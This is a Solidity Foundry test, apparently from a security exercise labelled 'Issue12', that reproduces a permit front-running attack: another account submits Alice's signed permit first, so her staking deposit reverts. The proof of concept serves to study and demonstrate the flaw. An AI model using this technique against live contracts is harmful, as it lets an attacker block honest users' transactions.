// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import {Test, console2} from "forge-std/Test.sol";
import "src/Issue12/PermitStake.sol";
import "src/Issue12/ERC20Permit.sol";

//https://book.getfoundry.sh/tutorials/testing-eip712

contract IssueTwelveTest is Test {
    ERC20PermitToken public erc20;
    PermitStake public stakeContract;
    SigUtils public sigUtils;

    uint256 internal alicePrivateKey;
    uint256 internal bobPrivateKey;

    address public alice;
    address public bob;

    function setUp() public {
        erc20 = new ERC20PermitToken();

        stakeContract = new PermitStake(address(erc20));

        sigUtils = new SigUtils(erc20.DOMAIN_SEPARATOR());

        alicePrivateKey = 0xA11CE;
        bobPrivateKey = 0xB0B;

        alice = vm.addr(alicePrivateKey);
        bob = vm.addr(bobPrivateKey);

        vm.startPrank(erc20.owner());
        erc20.mint(alice, 10000 ether);
        erc20.mint(bob, 10000 ether);

        vm.stopPrank();
    }

    function test_RevertOfPermit() public {
        SigUtils.Permit memory permit = SigUtils.Permit({
            owner: alice,
            spender: address(stakeContract),
            value: 10 ether,
            nonce: 0,
            deadline: 1 days
        });

        bytes32 digest = sigUtils.getTypedDataHash(permit);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePrivateKey, digest);

        bytes memory data = abi.encodeWithSignature(
            "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
            permit.owner,
            permit.spender,
            permit.value,
            permit.deadline,
            v,
            r,
            s
        );

        vm.prank(bob); // This is the only permit transaction that is the frontrun
        (bool success, ) = address(erc20).call(data);
        require(success, "External call failed");

        vm.prank(alice);
        vm.expectRevert("ERC20Permit: invalid signature");
        stakeContract.depositWithPermit( // this is the actual tx sent from the honest user
            permit.owner,
            permit.value,
            permit.deadline,
            v,
            r,
            s
        );
    }
}

contract SigUtils {
    bytes32 internal DOMAIN_SEPARATOR;

    constructor(bytes32 _DOMAIN_SEPARATOR) {
        DOMAIN_SEPARATOR = _DOMAIN_SEPARATOR;
    }

    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH =
        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    struct Permit {
        address owner;
        address spender;
        uint256 value;
        uint256 nonce;
        uint256 deadline;
    }

    // computes the hash of a permit
    function getStructHash(
        Permit memory _permit
    ) internal pure returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    PERMIT_TYPEHASH,
                    _permit.owner,
                    _permit.spender,
                    _permit.value,
                    _permit.nonce,
                    _permit.deadline
                )
            );
    }

    // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer
    function getTypedDataHash(
        Permit memory _permit
    ) public view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    DOMAIN_SEPARATOR,
                    getStructHash(_permit)
                )
            );
    }
}
